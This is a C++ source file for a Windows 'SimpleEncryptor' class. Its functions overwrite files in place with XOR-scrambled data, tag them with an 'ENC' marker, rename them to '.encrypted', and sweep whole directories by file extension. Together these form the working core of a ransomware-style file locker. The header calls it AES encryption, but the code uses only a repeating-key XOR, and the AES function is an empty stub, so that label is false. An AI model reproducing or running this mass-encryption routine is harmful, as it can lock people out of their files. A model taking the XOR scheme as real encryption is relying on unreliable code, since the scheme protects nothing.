/**
 * AES Encryption Utility Implementation
 */

#include "enc.h"
#include <fstream>
#include <iostream>

void SimpleEncryptor::XorEncrypt(std::vector<BYTE>& data, const std::string& key) {
    if (key.empty()) return;
    
    size_t keyLen = key.length();
    for (size_t i = 0; i < data.size(); i++) {
        data[i] ^= key[i % keyLen];
    }
}

//TODO
void SimpleEncryptor::AESEncrypt(std::vector<BYTE>& data, const std::string& key) {

}
bool SimpleEncryptor::EncryptFile(const std::string& filePath, const std::string& password) {
    // 读取文件
    std::ifstream inFile(filePath, std::ios::binary);
    if (!inFile.is_open()) {
        std::cerr << "[-] Cannot open file: " << filePath << std::endl;
        return false;
    }

    std::vector<BYTE> fileData((std::istreambuf_iterator<char>(inFile)),
                                std::istreambuf_iterator<char>());
    inFile.close();

    if (fileData.empty()) {
        return false;
    }

    // 检查是否已加密（避免重复加密）
    const char* magic = "ENC";
    if (fileData.size() >= 3 && 
        fileData[0] == magic[0] && 
        fileData[1] == magic[1] && 
        fileData[2] == magic[2]) {
        std::cout << "[!] File already encrypted: " << filePath << std::endl;
        return false;
    }

    // 加密数据
    XorEncrypt(fileData, password);

    // 添加加密标记
    std::vector<BYTE> encryptedData;
    encryptedData.push_back('E');
    encryptedData.push_back('N');
    encryptedData.push_back('C');
    encryptedData.insert(encryptedData.end(), fileData.begin(), fileData.end());

    // 写回文件
    std::ofstream outFile(filePath, std::ios::binary | std::ios::trunc);
    if (!outFile.is_open()) {
        std::cerr << "[-] Cannot write file: " << filePath << std::endl;
        return false;
    }

    outFile.write(reinterpret_cast<char*>(encryptedData.data()), encryptedData.size());
    outFile.close();

    // 重命名文件（添加 .encrypted 后缀）
    std::string encryptedPath = filePath + ".encrypted";
    if (MoveFileA(filePath.c_str(), encryptedPath.c_str())) {
        std::cout << "[+] Encrypted: " << filePath << " -> " << encryptedPath << std::endl;
    }

    return true;
}

bool SimpleEncryptor::DecryptFile(const std::string& filePath, const std::string& password) {
    std::ifstream inFile(filePath, std::ios::binary);
    if (!inFile.is_open()) {
        return false;
    }

    std::vector<BYTE> fileData((std::istreambuf_iterator<char>(inFile)),
                                std::istreambuf_iterator<char>());
    inFile.close();

    if (fileData.size() < 3) {
        return false;
    }

    // 检查加密标记
    if (fileData[0] != 'E' || fileData[1] != 'N' || fileData[2] != 'C') {
        std::cerr << "[-] File not encrypted: " << filePath << std::endl;
        return false;
    }

    // 移除标记
    std::vector<BYTE> encryptedData(fileData.begin() + 3, fileData.end());

    // 解密
    XorEncrypt(encryptedData, password);

    // 写回文件
    std::ofstream outFile(filePath, std::ios::binary | std::ios::trunc);
    if (!outFile.is_open()) {
        return false;
    }

    outFile.write(reinterpret_cast<char*>(encryptedData.data()), encryptedData.size());
    outFile.close();

    // 移除 .encrypted 后缀
    if (filePath.size() > 10 && filePath.substr(filePath.size() - 10) == ".encrypted") {
        std::string originalPath = filePath.substr(0, filePath.size() - 10);
        MoveFileA(filePath.c_str(), originalPath.c_str());
        std::cout << "[+] Decrypted: " << filePath << " -> " << originalPath << std::endl;
    }

    return true;
}

int SimpleEncryptor::EncryptDirectory(const std::string& directory,
                                     const std::vector<std::string>& extensions,
                                     const std::string& password) {
    int count = 0;
    WIN32_FIND_DATAA findData;
    
    for (const auto& ext : extensions) {
        std::string searchPath = directory + "\\*" + ext;
        HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);

        if (hFind == INVALID_HANDLE_VALUE) {
            continue;
        }

        do {
            if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                std::string fullPath = directory + "\\" + findData.cFileName;
                if (EncryptFile(fullPath, password)) {
                    count++;
                }
            }
        } while (FindNextFileA(hFind, &findData));

        FindClose(hFind);
    }

    return count;
}
